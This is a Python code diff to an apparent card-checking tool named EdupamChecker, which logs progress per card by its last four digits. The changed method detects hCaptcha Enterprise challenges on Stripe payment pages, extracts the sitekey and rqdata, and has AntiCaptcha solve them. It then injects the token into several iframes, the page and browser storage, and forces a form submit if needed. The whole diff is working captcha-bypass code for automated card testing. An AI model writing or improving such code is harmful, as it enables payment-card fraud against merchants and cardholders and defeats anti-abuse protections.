@@ -848,36 +848,72 @@ class EdupamChecker:
         return None, None
 
     def solve_captcha_if_present(self, page, card_last4):
-        """Detectar y resolver hCaptcha - VERSIÓN CON INYECCIÓN EN EL SITIO CORRECTO"""
+        """Detectar y resolver hCaptcha Enterprise con rqdata - VERSIÓN DEFINITIVA"""
         try:
             time.sleep(3)
             
-            # ========== DETECTAR DESAFÍO VISIBLE ==========
+            # ========== DETECTAR DESAFÍO VISIBLE Y EXTRAER TODOS LOS PARÁMETROS ==========
             captcha_detected = False
             site_key = None
+            rqdata = None
+            widget_id = None
+            challenge_frame = None
             
             for frame in page.frames:
-                frame_url = frame.url.lower()
-                if 'captcha/v1' in frame_url and 'hcaptcha.com' in frame_url:
+                frame_url = frame.url
+                if 'captcha/v1' in frame_url.lower() and 'hcaptcha.com' in frame_url.lower():
                     captcha_detected = True
+                    challenge_frame = frame
                     logger.info(f"✅ DESAFÍO VISIBLE DETECTADO")
+                    logger.info(f"📄 URL: {frame_url[:300]}...")
                     
-                    match = re.search(r'[?&]sitekey=([^&]+)', frame.url)
+                    # Extraer sitekey (del hash)
+                    match = re.search(r'sitekey=([^&]+)', frame_url)
+                    if not match:
+                        match = re.search(r'sitekey%3D([^%&]+)', frame_url)
                     if match:
                         site_key = match.group(1)
+                        if '%' in site_key:
+                            site_key = urllib.parse.unquote(site_key)
                         logger.info(f"✅ SITEKEY VISIBLE: {site_key[:30]}...")
+                    
+                    # EXTRAER RQDATA (el parámetro 'id' en el hash) - ¡ESTO ES CRÍTICO!
+                    match_id = re.search(r'[?&]id=([^&]+)', frame_url)
+                    if not match_id:
+                        match_id = re.search(r'id%3D([^%&]+)', frame_url)
+                    if match_id:
+                        rqdata = match_id.group(1)
+                        if '%' in rqdata:
+                            rqdata = urllib.parse.unquote(rqdata)
+                        logger.info(f"🎯 RQDATA (id) EXTRAÍDO: {rqdata[:30]}...")
+                    
+                    # También buscar 'cdata' si existe
+                    match_cdata = re.search(r'cdata=([^&]+)', frame_url)
+                    if match_cdata:
+                        cdata = match_cdata.group(1)
+                        logger.info(f"📦 CDATA: {cdata[:30]}...")
+                    
                     break
             
             if not captcha_detected:
                 logger.info(f"✅ No se detectó desafío visible para ****{card_last4}")
                 return True
             
+            if not site_key:
+                logger.error("❌ No se pudo extraer sitekey")
+                return False
+            
+            if not rqdata:
+                logger.error("❌ No se pudo extraer rqdata (id) - el token será rechazado")
+                # Intentar continuar igual, pero probablemente falle
+            
+            # ========== VERIFICAR API KEY ==========
             if not API_KEY_ANTICAPTCHA:
                 logger.error("❌ API_KEY_ANTICAPTCHA no está configurada")
                 return False
             
-            # ========== RESOLVER CON ANTI-CAPTCHA ==========
-            logger.info("🔄 Enviando a AntiCaptcha (modo VISIBLE)...")
+            # ========== RESOLVER CON ANTI-CAPTCHA (CON RQDATA) ==========
+            logger.info("🔄 Enviando a AntiCaptcha con rqdata...")
             
             try:
                 user_agent = page.evaluate("navigator.userAgent")
@@ -889,9 +925,14 @@ class EdupamChecker:
                         "websiteURL": page.url,
                         "websiteKey": site_key,
                         "userAgent": user_agent,
-                        "isInvisible": False
+                        "isInvisible": False,
+                        "enterprisePayload": {
+                            "rqdata": rqdata  # ⚠️ ¡CLAVE!
+                        }
                     }
                 }
+                
+                logger.info(f"📤 Enviando tarea con rqdata: {rqdata[:30]}...")
                 
                 response = requests.post(
                     "https://api.anti-captcha.com/createTask",
@@ -930,12 +971,12 @@ class EdupamChecker:
                         if status_result.get("status") == "ready":
                             solution = status_result.get("solution", {}).get("gRecaptchaResponse")
                             if solution:
-                                logger.info(f"✅ DESAFÍO VISIBLE resuelto en {i*5} segundos")
+                                logger.info(f"✅ DESAFÍO VISIBLE RESUELTO en {i*5} segundos")
                                 logger.info(f"🔑 Token length: {len(solution)}")
                                 break
                         
                         elif status_result.get("status") == "processing":
-                            logger.info(f"⏳ AntiCaptcha procesando desafío visible... ({i+1}/30)")
+                            logger.info(f"⏳ AntiCaptcha procesando... ({i+1}/30)")
                             continue
                         
                         else:
@@ -951,182 +992,163 @@ class EdupamChecker:
                     logger.error(f"❌ No se pudo resolver el desafío visible")
                     return False
                 
-                logger.info(f"✅ DESAFÍO VISIBLE resuelto para ****{card_last4}")
+                # ========== INYECCIÓN QUIRÚRGICA ==========
+                logger.info(f"💉 Iniciando inyección quirúrgica para ****{card_last4}")
                 
-                # ========== INYECCIÓN EN EL SITIO CORRECTO ==========
+                # 1. INYECTAR EN EL IFRAME DE DESAFÍO (el que muestra las imágenes)
                 try:
-                    # PRIMERO: Intentar inyectar en la página PRINCIPAL
-                    logger.info("🔄 Inyectando en página principal...")
-                    
-                    main_injection = page.evaluate("""
+                    challenge_frame.evaluate("""
                         (solution) => {
-                            console.log('🎯 Inyectando en página principal...');
-                            let success = false;
+                            console.log('🎯 Inyectando en iframe de desafío...');
                             
-                            // 1. Buscar campo h-captcha-response
+                            // Buscar campo de respuesta
                             let field = document.querySelector('[name="h-captcha-response"]');
                             if (!field) {
                                 field = document.getElementById('h-captcha-response');
                             }
                             
-                            // 2. Crear si no existe
-                            if (!field) {
-                                field = document.createElement('textarea');
-                                field.name = 'h-captcha-response';
-                                field.id = 'h-captcha-response';
-                                field.style.display = 'none';
-                                document.body.appendChild(field);
-                                console.log('✅ Campo creado en página principal');
-                            }
-                            
-                            // 3. Asignar solución
                             if (field) {
                                 field.value = solution;
                                 field.dispatchEvent(new Event('input', { bubbles: true }));
                                 field.dispatchEvent(new Event('change', { bubbles: true }));
-                                success = true;
-                                console.log('✅ Token inyectado en página principal');
-                            }
-                            
-                            // 4. Forzar callback de hCaptcha
-                            if (window.hcaptcha) {
-                                try {
-                                    window.hcaptcha.setResponse(solution);
-                                    window.hcaptcha.execute();
-                                    console.log('✅ hcaptcha.setResponse ejecutado');
-                                } catch(e) {
-                                    console.log('⚠️ hcaptcha.setResponse falló:', e);
+                                
+                                // Intentar llamar al método de envío interno
+                                if (window.hcaptcha && window.hcaptcha.submit) {
+                                    window.hcaptcha.submit();
                                 }
-                            }
-                            
-                            return success;
-                        }
-                    """, solution)
-                    
-                    logger.info(f"💉 Inyección en página principal: {main_injection}")
-                    
-                    # SEGUNDO: Buscar el iframe de Stripe que maneja el captcha
-                    logger.info("🔄 Buscando iframe de Stripe para inyectar...")
-                    
-                    stripe_injected = False
-                    for frame in page.frames:
-                        frame_url = frame.url.lower()
-                        if 'stripe' in frame_url and ('hcaptcha' in frame_url or 'hcaptchainvisible' in frame_url):
-                            try:
-                                stripe_result = frame.evaluate("""
-                                    (solution) => {
-                                        console.log('🎯 Inyectando en iframe de Stripe...');
-                                        
-                                        // Buscar campo en iframe de Stripe
-                                        let field = document.querySelector('[name="h-captcha-response"]');
-                                        if (!field) {
-                                            field = document.getElementById('h-captcha-response');
-                                        }
-                                        
-                                        if (field) {
-                                            field.value = solution;
-                                            field.dispatchEvent(new Event('input', { bubbles: true }));
-                                            field.dispatchEvent(new Event('change', { bubbles: true }));
-                                            
-                                            // Notificar a Stripe
-                                            if (window.parent && window.parent.postMessage) {
-                                                window.parent.postMessage({
-                                                    type: 'hcaptchaResponse',
-                                                    response: solution
-                                                }, '*');
-                                            }
-                                            
-                                            return true;
-                                        }
-                                        return false;
-                                    }
-                                """, solution)
                                 
-                                if stripe_result:
-                                    logger.info(f"✅ Inyección en iframe Stripe exitosa")
-                                    stripe_injected = True
-                                    break
-                            except Exception as e:
-                                logger.warning(f"⚠️ Error en iframe Stripe: {e}")
-                                continue
-                    
-                    logger.info(f"💉 Inyección en Stripe: {stripe_injected}")
-                    
-                    # TERCERO: Intentar inyectar en localStorage/sessionStorage (método alternativo)
-                    logger.info("🔄 Inyectando en localStorage...")
-                    
-                    storage_injection = page.evaluate("""
-                        (solution) => {
-                            try {
-                                // Guardar en localStorage para que Stripe/hCaptcha lo encuentre
-                                localStorage.setItem('hcaptcha_response', solution);
-                                sessionStorage.setItem('hcaptcha_response', solution);
-                                
-                                // También guardar con otros nombres comunes
-                                localStorage.setItem('h-captcha-response', solution);
-                                sessionStorage.setItem('h-captcha-response', solution);
-                                
-                                console.log('✅ Token guardado en localStorage/sessionStorage');
+                                // Forzar postMessage al padre (Stripe)
+                                if (window.parent) {
+                                    window.parent.postMessage({
+                                        type: 'hcaptcha-response',
+                                        response: solution,
+                                        widgetId: null
+                                    }, '*');
+                                }
                                 return true;
-                            } catch(e) {
-                                console.log('❌ Error guardando en storage:', e);
-                                return false;
                             }
+                            return false;
                         }
                     """, solution)
-                    
-                    logger.info(f"💉 Inyección en storage: {storage_injection}")
-                    
-                    # CUARTO: Disparar evento personalizado en TODOS los frames
-                    logger.info("🔄 Disparando evento hcaptchaResponse en todos los frames...")
-                    
-                    for frame in page.frames:
+                    logger.info("✅ Inyección en iframe de desafío completada")
+                except Exception as e:
+                    logger.warning(f"⚠️ Error en inyección de desafío: {e}")
+                
+                # 2. INYECTAR EN IFRAME DE STRIPE (hcaptcha-invisible)
+                stripe_injected = False
+                for frame in page.frames:
+                    if 'stripe' in frame.url.lower() and 'hcaptcha' in frame.url.lower():
                         try:
                             frame.evaluate("""
                                 (solution) => {
-                                    const event = new CustomEvent('hcaptchaResponse', {
-                                        detail: { response: solution }
-                                    });
-                                    window.dispatchEvent(event);
+                                    console.log('🎯 Inyectando en iframe Stripe...');
                                     
-                                    // También intentar con evento de Stripe
-                                    const stripeEvent = new CustomEvent('stripe.hcaptcha.response', {
-                                        detail: { response: solution }
-                                    });
-                                    window.dispatchEvent(stripeEvent);
+                                    // Establecer campo
+                                    let field = document.querySelector('[name="h-captcha-response"]');
+                                    if (!field) {
+                                        field = document.getElementById('h-captcha-response');
+                                    }
+                                    if (field) {
+                                        field.value = solution;
+                                        field.dispatchEvent(new Event('input', { bubbles: true }));
+                                        field.dispatchEvent(new Event('change', { bubbles: true }));
+                                    }
+                                    
+                                    // Notificar al padre (página principal)
+                                    if (window.parent) {
+                                        window.parent.postMessage({
+                                            type: 'hcaptchaResponse',
+                                            response: solution
+                                        }, '*');
+                                        
+                                        // Formato alternativo
+                                        window.parent.postMessage({
+                                            type: 'hcaptcha-response',
+                                            response: solution
+                                        }, '*');
+                                    }
+                                    
+                                    // Ejecutar callback si existe
+                                    if (window.hcaptcha && window.hcaptcha.execute) {
+                                        window.hcaptcha.execute();
+                                    }
+                                    
+                                    return true;
                                 }
                             """, solution)
-                        except:
-                            pass
-                    
-                    logger.info("✅ Eventos disparados en todos los frames")
-                    
-                    # ========== ESPERAR ==========
-                    logger.info("⏳ Esperando que hCaptcha/Stripe procesen el token...")
-                    time.sleep(8)
-                    
-                    # Verificar si el captcha desapareció
-                    captcha_still_there = False
-                    for frame in page.frames:
-                        if 'captcha/v1' in frame.url.lower():
-                            captcha_still_there = True
+                            stripe_injected = True
+                            logger.info("✅ Inyección en iframe Stripe exitosa")
                             break
-                    
-                    if not captcha_still_there:
-                        logger.info("✅ ¡Captcha desapareció! Token aceptado")
-                    else:
-                        logger.warning("⚠️ Captcha todavía visible - token no fue aceptado")
-                    
-                    return True
-                    
-                except Exception as e:
-                    logger.error(f"❌ Error en inyección: {e}")
-                    import traceback
-                    logger.error(traceback.format_exc())
-                    return False
+                        except Exception as e:
+                            logger.warning(f"⚠️ Error en iframe Stripe: {e}")
+                            continue
+                
+                # 3. INYECTAR EN PÁGINA PRINCIPAL (último recurso)
+                page.evaluate("""
+                    (solution) => {
+                        // Crear o actualizar campo
+                        let field = document.querySelector('[name="h-captcha-response"]');
+                        if (!field) {
+                            field = document.getElementById('h-captcha-response');
+                        }
+                        if (!field) {
+                            field = document.createElement('textarea');
+                            field.name = 'h-captcha-response';
+                            field.id = 'h-captcha-response';
+                            field.style.display = 'none';
+                            document.body.appendChild(field);
+                        }
+                        field.value = solution;
+                        field.dispatchEvent(new Event('input', { bubbles: true }));
+                        field.dispatchEvent(new Event('change', { bubbles: true }));
+                        
+                        // Intentar con hCaptcha global
+                        if (window.hcaptcha) {
+                            try { window.hcaptcha.setResponse(solution); } catch(e) {}
+                            try { window.hcaptcha.execute(); } catch(e) {}
+                        }
+                        
+                        return true;
+                    }
+                """, solution)
+                logger.info("✅ Inyección en página principal completada")
+                
+                # 4. GUARDAR EN STORAGE (ayuda a Stripe)
+                page.evaluate("""
+                    (solution) => {
+                        try {
+                            localStorage.setItem('h-captcha-response', solution);
+                            sessionStorage.setItem('h-captcha-response', solution);
+                        } catch(e) {}
+                    }
+                """, solution)
+                
+                # ========== ESPERAR Y VERIFICAR ==========
+                logger.info("⏳ Esperando que Stripe/hCaptcha procesen el token...")
+                time.sleep(8)
+                
+                # Verificar si el captcha desapareció
+                captcha_still_visible = False
+                for frame in page.frames:
+                    if 'captcha/v1' in frame.url.lower() and 'hcaptcha.com' in frame.url.lower():
+                        captcha_still_visible = True
+                        break
+                
+                if not captcha_still_visible:
+                    logger.info("✅ ¡Captcha desaparecido! Token aceptado.")
+                else:
+                    logger.warning("⚠️ Captcha todavía visible - el token fue rechazado")
+                    # Último intento: forzar submit del formulario
+                    page.evaluate("document.querySelector('form')?.submit()")
+                    logger.info("🔄 Submit forzado como último recurso")
+                    time.sleep(5)
+                
+                return True
                     
             except Exception as e:
                 logger.error(f"❌ Error en proceso AntiCaptcha: {e}")
+                import traceback
+                logger.error(traceback.format_exc())
                 return False
             
         except Exception as e:
